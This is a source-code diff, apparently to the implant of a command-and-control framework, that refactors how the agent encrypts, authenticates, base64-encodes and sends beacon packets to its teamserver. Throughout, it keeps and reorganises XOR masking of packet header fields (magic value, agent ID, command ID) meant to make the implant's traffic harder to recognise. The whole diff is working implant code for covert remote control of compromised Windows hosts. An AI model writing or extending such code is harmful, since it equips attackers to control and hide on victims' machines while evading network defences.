@@ -14,6 +14,8 @@
 #include <crypt/AesCrypt.h>
 /* [HVC-006 2026-03-26] HMAC-SHA256 for packet authentication. */
 #include <crypt/HmacSha256.h>
+/* [HVC-029] Wire encoding module: IV, AES-CTR, HMAC, base64. */
+#include <crypt/WireEncoder.h>
 
 VOID Int64ToBuffer( PUCHAR Buffer, UINT64 Value )
 {
@@ -302,10 +304,24 @@ BOOL PackageTransmitNow(
             for ( _i = 0; _i < 16; _i++ ) { _h[ 4 + _i ] ^= _mb[ _i % 4 ]; }
         }
 
-        if ( TransportSend( Package->Buffer, Package->Length, Response, Size ) ) {
-            Success = TRUE;
-        } else {
-            PUTS_DONT_SEND("TransportSend failed!")
+        /* [HVC-029] PackageTransmitAll routes through WireEncode which produces
+         * base64 output.  PackageTransmitNow bypasses WireEncode, so base64-
+         * encode here so the teamserver's base64 request-body decode succeeds. */
+        {
+            PBYTE  B64Buf = NULL;
+            SIZE_T B64Len = 0;
+            Base64Encode( Package->Buffer, (SIZE_T)Package->Length, (PVOID*)&B64Buf, &B64Len );
+            if ( B64Buf ) {
+                if ( TransportSend( B64Buf, B64Len, Response, Size ) ) {
+                    Success = TRUE;
+                } else {
+                    PUTS_DONT_SEND( "PackageTransmitNow: TransportSend failed" )
+                }
+                MemSet( B64Buf, 0, B64Len );
+                Instance->Win32.LocalFree( B64Buf );
+            } else {
+                PUTS_DONT_SEND( "PackageTransmitNow: Base64Encode failed" )
+            }
         }
 
         /* [HVC-003 2026-03-26] Reverse the header mask — XOR with same mask
@@ -437,7 +453,6 @@ BOOL PackageTransmitAll(
     OUT    PVOID*   Response,
     OUT    PSIZE_T  Size
 ) {
-    AESCTX   AesCtx          = { 0 };
     BOOL     Success         = FALSE;
     UINT32   Padding         = 0;
     PPACKAGE Package         = NULL;
@@ -565,124 +580,96 @@ BOOL PackageTransmitAll(
         }
     }
 
-    /* [HVC-004 2026-03-26] Generate a fresh random IV for each beacon packet and
-     * prepend it in plaintext between the header and encrypted payload so the
-     * teamserver can extract and use it for decryption. A separate WireBuffer is
-     * allocated to avoid modifying Package->Buffer in-place.
-     * WireBuffer layout: [SIZE(4)][header fields(16)][IV(16)][encrypted payload]
-     * See TrafficImprovements.md §4. */
+    /* [HVC-029] Wire encoding refactor: IV generation, AES-CTR encryption, HMAC-SHA256
+     * authentication, and base64 encoding are now delegated to WireEncode().
+     *
+     * MaskedHeader layout (Padding = 20 bytes):
+     *   [SIZE(4)] [Magic(4)|AgentID(4)|CommandID(4)|RequestID(4)] (XOR-masked bytes 4-19)
+     *
+     * WireEncode produces: base64([MaskedHeader | IV(16) | AES-CTR(payload) | HMAC(32)])
+     * TransportHttp sends this base64 blob directly (no additional base64 in TransportHttp).
+     */
     {
-        UCHAR   RandIV[ AES_BLOCKLEN ];
-        PUCHAR  WireBuffer;
-        UINT32  WireLength;
-        UINT32  _r;
-        UINT32  _i;
+        UCHAR  MaskedHeader[ 20 ];
+        PUCHAR EncPayload;
+        UINT32 EncLen;
+        UINT32 WireLength;
+        UINT32 _i;
 
-        /* Fill 16-byte random IV from 4× RandomNumber32() calls (big-endian store) */
-        for ( _i = 0; _i < AES_BLOCKLEN / sizeof( UINT32 ); _i++ ) {
-            _r = RandomNumber32();
-            RandIV[ _i * 4 + 0 ] = (UCHAR)( _r >> 24 );
-            RandIV[ _i * 4 + 1 ] = (UCHAR)( _r >> 16 );
-            RandIV[ _i * 4 + 2 ] = (UCHAR)( _r >>  8 );
-            RandIV[ _i * 4 + 3 ] = (UCHAR)  _r;
-        }
+        /* [HVC-007 2026-03-28] Select compressed or original payload. */
+        EncPayload = PayloadCompressed ? CompressedBuf              : Package->Buffer + Padding;
+        EncLen     = PayloadCompressed ? CompressedLen              : Package->Length - Padding;
 
-        /* [HVC-007 2026-03-28] Use the compressed buffer if compression succeeded,
-         * otherwise fall back to the original plaintext payload. */
-        PUCHAR EncPayload = PayloadCompressed ? CompressedBuf              : Package->Buffer + Padding;
-        UINT32 EncLen     = PayloadCompressed ? CompressedLen              : Package->Length - Padding;
-
-        PRINTF( "PackageTransmitAll: encrypt PayloadLen=%lu Padding=%lu Compressed=%d\n",
+        PRINTF( "PackageTransmitAll: WireEncode PayloadLen=%lu Padding=%lu Compressed=%d\n",
                 (unsigned long) EncLen, (unsigned long) Padding, PayloadCompressed )
-        PRINT_HEX( RandIV, 16 )
 
-        /* Encrypt payload region using the fresh random IV */
-        AesInit( &AesCtx, Instance->Config.AES.Key, RandIV );
-        AesXCryptBuffer( &AesCtx, EncPayload, EncLen );
-
-        /* Build WireBuffer: header (Padding bytes) + IV (16 bytes) + encrypted payload */
+        /* Build MaskedHeader from the first Padding bytes of Package->Buffer.
+         * WireLength = Padding + IV(16) + EncLen; SIZE field = WireLength - 4, with
+         * optional compression bit in bit 31.  Bytes 4-19 are XOR-obfuscated
+         * using the SIZE field value exactly as HVC-003 specifies. */
         WireLength = Padding + AES_BLOCKLEN + EncLen;
-        WireBuffer = (PUCHAR) Instance->Win32.LocalAlloc( LPTR, WireLength );
-        MemCopy( WireBuffer,                           Package->Buffer, Padding    );
-        MemCopy( WireBuffer + Padding,                 RandIV,          AES_BLOCKLEN );
-        MemCopy( WireBuffer + Padding + AES_BLOCKLEN,  EncPayload,      EncLen     );
+        MemCopy( MaskedHeader, Package->Buffer, Padding );
 
-        /* Update SIZE field in WireBuffer: (bytes after SIZE) | compression bit.
-         * [HVC-007] Bit 31 signals LZNT1 compression to the teamserver.
-         * The HVC-003 XOR mask below reads this value, so both sides compute
-         * the same mask. The teamserver strips bit 31 in ParseHeader. */
+        /* Update SIZE field (bytes 0-3) with wire length and compression bit */
         {
             UINT32 WireSize = WireLength - sizeof( UINT32 );
             if ( PayloadCompressed ) WireSize |= 0x80000000UL;
-            Int32ToBuffer( WireBuffer, WireSize );
+            MaskedHeader[ 0 ] = (UCHAR)( WireSize >> 24 );
+            MaskedHeader[ 1 ] = (UCHAR)( WireSize >> 16 );
+            MaskedHeader[ 2 ] = (UCHAR)( WireSize >>  8 );
+            MaskedHeader[ 3 ] = (UCHAR)  WireSize;
         }
 
-        /* [HVC-003 2026-03-26] Obfuscate outer header bytes 4-19 in WireBuffer
-         * using the updated WireBuffer SIZE as the mask base. See TrafficImprovements.md §3. */
+        /* [HVC-003] XOR-obfuscate bytes 4-19 using SIZE ^ HEADER_MASK_SEED as mask */
         {
-            PUCHAR _h  = WireBuffer;
-            UINT32 _m  = ( ((UINT32)_h[0] << 24) | ((UINT32)_h[1] << 16)
-                         | ((UINT32)_h[2] <<  8) |  (UINT32)_h[3] )
+            UINT32 _m  = ( ((UINT32)MaskedHeader[0] << 24) | ((UINT32)MaskedHeader[1] << 16)
+                         | ((UINT32)MaskedHeader[2] <<  8) |  (UINT32)MaskedHeader[3] )
                        ^ HEADER_MASK_SEED;
             UCHAR  _mb[4] = { (UCHAR)(_m >> 24), (UCHAR)(_m >> 16),
                               (UCHAR)(_m >>  8), (UCHAR) _m };
-            for ( _i = 0; _i < 16; _i++ ) { _h[ 4 + _i ] ^= _mb[ _i % 4 ]; }
+            for ( _i = 0; _i < 16; _i++ ) { MaskedHeader[ 4 + _i ] ^= _mb[ _i % 4 ]; }
         }
 
-        /* [HVC-006 2026-03-26] Compute HMAC-SHA256 over the masked WireBuffer and
-         * append the 32-byte tag (encrypt-then-MAC). The teamserver verifies the
-         * tag before parsing. See TrafficImprovements.md §6. */
+        /* [HVC-029] Derive MAC key and call WireEncode.
+         * WireEncode handles IV generation, AES-CTR encryption of EncPayload,
+         * HMAC-SHA256 over the authenticated data, and base64 encoding.
+         * The output is a ready-to-send base64 blob. */
         {
             UCHAR  MacKey[ HMAC_SHA256_SIZE ];
-            UCHAR  Tag[ HMAC_SHA256_SIZE ];
-            PUCHAR AuthWireBuffer;
-            UINT32 AuthWireLength;
+            PBYTE  AuthWireBuffer = NULL;
+            SIZE_T AuthWireLength = 0;
 
-            /* Derive MAC key: HMAC-SHA256(AES_key, "mac") */
             HmacSha256( Instance->Config.AES.Key, 32,
                         (PUCHAR)"mac", 3,
                         MacKey );
 
-            /* Authenticate: SIZE + masked header + IV + ciphertext */
-            HmacSha256( MacKey, HMAC_SHA256_SIZE,
-                        (PUCHAR) WireBuffer, WireLength,
-                        Tag );
+            if ( WireEncode( MaskedHeader, Padding,
+                             EncPayload, (SIZE_T)EncLen,
+                             Instance->Config.AES.Key, MacKey,
+                             &AuthWireBuffer, &AuthWireLength ) )
+            {
+                PRINTF( "PackageTransmitAll: TransportSend AuthWireLength=%llu (base64)\n",
+                        (unsigned long long) AuthWireLength )
+                if ( TransportSend( AuthWireBuffer, AuthWireLength, Response, Size ) ) {
+                    Success = TRUE;
+                    PRINTF( "PackageTransmitAll: TransportSend OK Response=%p ResponseSize=%llu\n",
+                            Response ? *Response : NULL,
+                            (unsigned long long) ( Size ? *Size : 0 ) )
+                } else {
+                    PUTS_DONT_SEND( "TransportSend failed!" )
+                }
 
-            MemSet( MacKey, 0, sizeof( MacKey ) );
-
-            /* Build AuthWireBuffer = WireBuffer || Tag */
-            AuthWireLength = WireLength + HMAC_SHA256_SIZE;
-            AuthWireBuffer = (PUCHAR) Instance->Win32.LocalAlloc( LPTR, AuthWireLength );
-            MemCopy( AuthWireBuffer,              WireBuffer, WireLength       );
-            MemCopy( AuthWireBuffer + WireLength, Tag,        HMAC_SHA256_SIZE );
-
-            MemSet( Tag, 0, sizeof( Tag ) );
-
-            PRINTF( "PackageTransmitAll: TransportSend AuthWireLength=%lu (Wire=%lu + HMAC=32)\n",
-                    (unsigned long) AuthWireLength, (unsigned long) WireLength )
-            if ( TransportSend( AuthWireBuffer, AuthWireLength, Response, Size ) ) {
-                Success = TRUE;
-                PRINTF( "PackageTransmitAll: TransportSend OK Response=%p ResponseSize=%llu\n",
-                        Response ? *Response : NULL,
-                        (unsigned long long) ( Size ? *Size : 0 ) )
-            } else {
-                PUTS_DONT_SEND("TransportSend failed!")
+                MemSet( AuthWireBuffer, 0, AuthWireLength );
+                Instance->Win32.LocalFree( AuthWireBuffer );
             }
 
-            MemSet( AuthWireBuffer, 0, AuthWireLength );
-            Instance->Win32.LocalFree( AuthWireBuffer );
+            MemSet( MacKey, 0, sizeof( MacKey ) );
         }
 
-        /* Wipe and free WireBuffer */
-        MemSet( WireBuffer, 0, WireLength );
-        Instance->Win32.LocalFree( WireBuffer );
-
-        if ( ! PayloadCompressed ) {
-            /* Re-decrypt Package->Buffer so queue-management code below sees clean data */
-            AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
-        } else {
-            /* [HVC-007] Compressed path: Package->Buffer was never modified.
-             * Wipe and free the encrypted CompressedBuf. */
+        /* [HVC-007] Compressed path: wipe and free CompressedBuf.
+         * Uncompressed path: Package->Buffer was never modified by WireEncode
+         * (WireEncode operates on a copy), so no re-decrypt is needed. */
+        if ( PayloadCompressed ) {
             MemSet( CompressedBuf, 0, CompressedLen );
             Instance->Win32.LocalFree( CompressedBuf );
             CompressedBuf = NULL;
